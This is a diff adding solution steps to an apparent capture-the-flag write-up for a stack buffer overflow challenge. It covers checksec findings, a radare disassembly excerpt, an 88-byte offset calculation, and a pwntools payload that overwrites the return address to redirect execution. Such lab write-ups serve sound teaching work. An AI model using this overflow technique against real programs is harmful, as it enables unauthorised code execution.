@@ -2,6 +2,9 @@
 
 ## Solution
 
+First we run a checksec on the file and see there is no canary and no PIE.
+
+Next we open the program in radare.
 
 ```assembly 
 23: sym.win ();                                                                                                    
@@ -43,3 +46,6 @@
             0x004011d8      0f1f84000000.  nop dword [rax + rax]                                                     
             ; DATA XREF from entry0 @ 0x4010aa                       
  ```
+Here we see the space we need to fill come from the two variable ```0x60-0x8=88```
+
+So we run ```ipython``` and we import pwn and send the payload of ```p.sendline(b'A' * 88 + p64(0x00401176))``` with ```0x00401176``` being the address that takes us to main. 
